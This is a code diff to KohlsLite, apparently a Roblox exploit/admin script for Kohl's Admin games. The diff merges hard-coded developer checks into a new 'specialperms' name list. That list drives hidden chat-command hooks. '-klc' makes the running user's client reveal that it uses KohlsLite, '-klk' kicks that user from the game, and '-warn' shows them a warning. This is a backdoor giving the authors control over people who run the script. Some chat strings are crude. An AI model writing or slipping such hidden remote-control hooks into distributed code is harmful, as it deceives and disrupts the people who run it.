@@ -53,6 +53,9 @@ local whitelist = {"me_123eq","me_crashking","ScriptingProgrammer","t_echr","BAN
 -- Players you cannot kick
 local nokick = {"me_123eq","me_crashking","ScriptingProgrammer","t_echr","BANNter_Original","witnessfox22","IceStuds","atprog","Di33le2","Dekryptionite","3cxos","hudhejeir","BIGpe7niss7","clydekash","t_echl"}
 
+-- Players with special perms
+local specialperms = {"me_123eq","me_crashking","ScriptingProgrammer","t_echr","witnessfox22","IceStuds","atprog","Di33le2","Dekryptionite","3cxos","BIGpe7niss7","clydekash","t_echl"}
+
 -- New users get blacklisted (prevent crashers)
 local newplrslocked = {} -- don't edit!!
 local newplrautoslock = true -- if new players under 21 days join they get blacklisted
@@ -5456,22 +5459,12 @@ v.Chatted:Connect(function(msg)
 		end
 					
 		-- // dev \\ --
-		if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
-                        	Speak("[KohlsLite]: I use KohlsLite!")
-                end
-
-		if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "dawninja21" or v.Name == "Dawninja21alt") then
+		if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
                         	Speak("[KohlsLite]: I use KohlsLite!")
 			end
                 end
-
-                if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
-			if not table.find(nokick,game.Players.LocalPlayer.Name) then
-	                 	Speak("[KohlsLite]: I use KohlsLite!")
-			end
-                end
-
+					
 	        if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "atprog" then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 	                 	Speak("[PR Script]: atprog is my daddy fr!")
@@ -5488,7 +5481,7 @@ v.Chatted:Connect(function(msg)
 			end
                 end  
     
-                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
+                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 				game.Players.LocalPlayer:Kick("[KohlsLite]: You were kicked by a KohlsLite admin!")
 			end
@@ -5504,7 +5497,7 @@ v.Chatted:Connect(function(msg)
                     		Remind("[KohlsLite]: You have been warned!")
                 end
 
-                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
+                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
 			if not table.find(nokick,game.Players.LocalPlayer.Name) then
 				Remind("[PR Script]: You have been warned!")
 			end
